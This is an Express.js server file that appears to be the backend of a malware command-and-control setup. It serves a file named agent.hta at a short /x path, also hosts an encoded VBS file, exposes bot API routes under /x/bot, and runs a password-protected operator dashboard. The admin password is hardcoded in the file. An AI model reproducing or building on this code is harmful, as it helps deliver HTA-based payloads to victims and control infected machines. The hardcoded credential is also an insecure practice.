const express = require('express');
const path = require('path');
const basicAuth = require('express-basic-auth');
const config = require('./config');

const apiRoutes = require('./routes/api');
const dashboardRoutes = require('./routes/dashboard');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static files (still serves /agent.hta, /enc.vbs, /dashboard.html, etc.)
app.use(express.static(path.join(__dirname, 'public')));

// Dashboard login protection
const dashboardUser = 'admin';
const dashboardPass = 'YourStrongPassword123!';   // CHANGE THIS

app.use(['/api', '/dashboard'], basicAuth({
    users: { [dashboardUser]: dashboardPass },
    challenge: true,
    realm: 'Dashboard'
}));

// --- New route: serve agent.hta at /x ---
app.get('/x', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'agent.hta'));
});

// Existing routes
app.use('/x/bot', apiRoutes);
app.use('/api', dashboardRoutes);

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.listen(config.PORT, () => {
    console.log(`Server running on port ${config.PORT}`);
});
